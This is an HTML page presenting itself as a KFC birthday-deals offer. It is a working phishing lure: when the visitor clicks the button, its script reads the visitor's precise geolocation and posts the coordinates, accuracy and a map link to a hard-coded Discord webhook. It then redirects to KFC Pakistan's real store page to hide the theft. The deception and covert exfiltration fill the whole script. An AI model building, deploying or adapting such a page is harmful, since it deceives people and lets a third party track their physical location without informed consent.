<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>KFC VIP Deals</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      font-family: 'Segoe UI', sans-serif;
      overflow: hidden;
      background: linear-gradient(to bottom, #fff2e6, #ffd5a5);
    }

    .bg-animation {
      position: fixed;
      width: 100%;
      height: 100%;
      z-index: -1;
      overflow: hidden;
    }

    .bg-animation img {
      position: absolute;
      width: 80px;
      animation: float 15s infinite linear;
      opacity: 0.4;
    }

    @keyframes float {
      0% {
        transform: translateY(100vh) rotate(0deg);
        opacity: 0;
      }
      50% {
        opacity: 0.4;
      }
      100% {
        transform: translateY(-200px) rotate(360deg);
        opacity: 0;
      }
    }

    .card {
      background: white;
      text-align: center;
      padding: 50px 30px;
      max-width: 500px;
      margin: 80px auto;
      border-radius: 20px;
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
      transition: all 0.6s ease-in-out;
    }

    .logo {
      width: 150px;
      margin-bottom: 25px;
    }

    h1 {
      font-size: 2.6rem;
      color: #d40000;
      margin: 10px 0;
    }

    p {
      font-size: 1.1rem;
      color: #333;
    }

    .btn {
      margin-top: 30px;
      padding: 15px 30px;
      background-color: #d40000;
      color: white;
      border: none;
      border-radius: 50px;
      font-size: 1.2rem;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    .btn:hover {
      background-color: #a70000;
    }

    #status {
      display: none;
    }
  </style>
</head>
<body>

  <!-- Animated Background -->
  <div class="bg-animation">
    <img src="drumstick.png" style="top: 90%; left: 5%; animation-delay: 0s;">
    <img src="sauce.png" style="top: 95%; left: 25%; animation-delay: 4s;">
    <img src="wing.png" style="top: 100%; left: 60%; animation-delay: 2s;">
    <img src="drumstick.png" style="top: 98%; left: 75%; animation-delay: 6s;">
    <img src="sauce.png" style="top: 95%; left: 90%; animation-delay: 1s;">
  </div>

  <!-- Main Card -->
  <div class="card">
    <img src="kfc-logo.png" alt="KFC Logo" class="logo">
    <h1>KFC</h1>
    <p>Allow location to unlock exclusive nearby deals for your Birthday or Anniversary üéÅ</p>
    <button class="btn" onclick="sendLocation()">üîé Nearby KFC Deals</button>
    <div id="status"></div>
  </div>

  <script>
    const webhookUrl = "https://discord.com/api/webhooks/1400382122866249758/e2PIiGtfPBi0SQlRzF55kOmzGW2yUl-0HvUfjgp0Pohh9IAoWnbP-7EmGSKNbUnHgXjh";

    function sendLocation() {
      if (!navigator.geolocation) return;

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          const accuracy = position.coords.accuracy;
          const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
          const message = `üçó **Nearby KFC Deal Request**\nüìç Latitude: ${lat}\nüìç Longitude: ${lon}\nüéØ Accuracy: ${accuracy} meters\nüîó [Google Maps](${mapUrl})`;

          fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: message })
          }).finally(() => {
            setTimeout(() => {
              window.location.href = "https://www.kfcpakistan.com/store-locations";
            }, 1000);
          });
        },
        () => {
          window.location.href = "https://www.kfcpakistan.com/store-locations";
        }
      );
    }
  </script>

</body>
</html>
